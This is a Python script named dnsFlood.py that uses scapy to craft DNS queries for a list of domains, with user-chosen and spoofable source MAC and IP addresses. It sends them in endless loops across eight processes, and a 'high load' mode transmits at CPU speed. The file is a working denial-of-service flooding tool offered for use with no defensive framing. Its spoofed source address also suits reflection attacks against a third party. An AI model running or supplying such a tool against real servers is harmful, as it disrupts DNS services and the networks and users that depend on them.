#!/usr/bin/env python3

import sys
import os
import re
from random import randint
from scapy import all as scapy
from multiprocessing import Pool

def printHelp():
    helpString = '''
    USAGE:

    ./dnsFlood.py [domain list file] <arg1, arg2, ...>

    
    ARGUMENTS:

     -h | --help        print help
    -hl | --high-load   enable high load mode -> in this mode only the first 8 domains are looped at cpu speed with 8 threads
    -sm | --src-mac     set source mac address
    -dm | --dst-mac     set destination mac address
    -si | --src-ip      set source ip addess
    -di | --dst-ip      set destination ip address
'''
    print(helpString)

def macCheck(macAddress):
    if re.search(r'((\d|[a-f]){2}:){5}(\d|[a-f]){2}',macAddress):
        return True
    else:
        return False

def ipCheck(ipAddress):
    if re.search(r'(\d{1,3}\.){3}\d{1,3}', ipAddress):
        for octect in ipAddress.split('.'):
            if int(octect) > 255:
                return False
        return True
    else:
        return False

def dnsPollerHL(dnsPacket):
        scapy.sendp(dnsPacket, inter=0, loop=1, iface='eth0')

def dnsPollerSlow(dnsPacket):
    scapy.sendp(dnsPacket, inter=0.1, count=1, iface='eth0')

def main():

    dnsListFileN = ""
    probeMode = 'slow'

    srcMac,dstMac,srcIp,dstIp = '','','',''

    if len(sys.argv) < 2:
        printHelp()
        quit()
    else:
        i=1 
        while i < len(sys.argv):
            if re.search(r'^(--|-)\S+', sys.argv[i]):
                if sys.argv[i] == '--help' or sys.argv[i] == '-h':
                    i+=1
                    printHelp()
                    quit()
                elif sys.argv[i] == '-hl' or sys.argv[i] == '--high-load':
                    probeMode = 'fast'
                    i+=1
                elif sys.argv[i] == '-sm' or sys.argv[i] == '--src-mac':
                    if macCheck(sys.argv[i+1]):
                        srcMac = sys.argv[i+1]
                        i+=2
                    else:
                        print("[!] invalid mac address: " + sys.argv[i])
                        printHelp()
                        quit()
                elif sys.argv[i] == '-dm' or sys.argv[i] == '--dst-mac':
                    if macCheck(sys.argv[i+1]):
                        dstMac = sys.argv[i+1]
                        i+=2
                    else:
                        print("[!] invalid mac address: " + sys.argv[i+1])
                        printHelp()
                        quit()
                elif sys.argv[i] == '-si' or sys.argv[i] == '--src-ip':
                    if ipCheck(sys.argv[i+1]):
                        srcIp = sys.argv[i+1]
                        i+=2
                    else:
                        print("[!] invalid ip address: " + sys.argv[i+1])
                        printHelp()
                        quit()
                elif sys.argv[i] == '-di' or sys.argv[i] == '--dst-ip':
                    if ipCheck(sys.argv[i+1]):
                        dstIp = sys.argv[i+1]
                        i+=2
                    else:
                        print("[!] invalid ip address: " + sys.argv[i+1])
                        printHelp()
                        quit()
                else:
                    print("[!] invalid option: " + sys.argv[i])
                    printHelp()
                    quit()
            else:
                dnsListFileN = sys.argv[i]
                i+=1

    print("[+] Network values: ")
    print("source mac: " + srcMac)
    print("destination mac: " + dstMac)
    print("source ip: " + srcIp)
    print("destination ip: " + dstIp)

    if srcMac == '' or srcIp == '' or dstIp == '' or dstMac == '':
        print("[!] invalid network parameters")
        printHelp()
        quit()


    lPackets = []
    with open(dnsListFileN) as file:
        for line in file:
            lPackets.append(scapy.Ether(src=srcMac, dst=dstMac) / scapy.IP(src=srcIp, dst=dstIp)  / scapy.UDP(sport=randint(2000, 60000), dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=line.replace('\n','').replace('*','')))) 
    
    if probeMode == 'fast':
        print("[+] probing in high load mode")
        
        with Pool(processes = 8) as pool:
            pool.map(dnsPollerHL,lPackets)
    
    elif probeMode == 'slow':
        print("[+] probing in slow mode")
        while True:
            with Pool(processes = 8) as pool:
                pool.map(dnsPollerSlow,lPackets)

    else:
        print('[!] invalid probe mode')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
